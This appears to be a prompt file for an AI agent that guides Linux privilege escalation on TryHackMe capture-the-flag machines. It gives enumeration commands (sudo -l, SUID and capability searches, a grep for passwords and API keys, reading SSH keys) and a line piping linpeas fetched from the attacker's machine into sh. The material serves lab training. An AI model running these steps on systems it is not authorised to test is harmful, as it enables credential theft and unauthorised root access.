---
description: Linux local privilege escalation — enumeration checklist and analysis
---

Guide Linux privesc on the shell we have. Args (optional): $ARGUMENTS

Walk me through enumeration, then analyze whatever output I paste back. Prioritize the
quick wins first — most THM Linux privesc is one of the top four below.

## 1. The high-yield quick checks (paste output back to me)
- `sudo -l` — misconfigured sudo is the #1 THM vector; map any allowed binary to GTFOBins
- `find / -perm -4000 -type f 2>/dev/null` — SUID binaries → GTFOBins
- `getcap -r / 2>/dev/null` — file capabilities (cap_setuid etc.)
- `id` and `groups` — interesting groups (docker, lxd, disk, adm, sudo)

## 2. Scheduled tasks / processes
- `cat /etc/crontab` and `ls -la /etc/cron.*` — writable scripts run as root?
- Run pspy to catch hidden/short cron jobs and process cmdlines:
  serve `pspy64` over HTTP, download, `chmod +x`, run it
- Watch for scripts using relative paths or writable PATH dirs

## 3. Credentials & config leaks
- `~/.bash_history`, `.ssh/` keys, `.config`, saved app configs
- `grep -rEi 'password|passwd|secret|api[_-]?key' /etc /var/www /opt 2>/dev/null`
- World-readable backup files, `.git` dirs, database creds

## 4. System / kernel
- `uname -a`, `cat /etc/os-release` — kernel exploits LAST (unreliable), but note the version
- Writable `/etc/passwd` or `/etc/shadow`? Writable PATH entries?
- NFS shares with `no_root_squash` (`cat /etc/exports`)

## 5. Automated enum
- linpeas: serve `linpeas.sh` over HTTP, `curl http://<tun0>/linpeas.sh | sh | tee scans/linpeas.txt`
- linenum / linux-smart-enumeration as alternatives

## 6. Analysis
When I paste enum output, hand it to the privesc-advisor agent for a ranked plan with
exact commands and the matching GTFOBins entry. Record the winning path + root flag in notes.md.
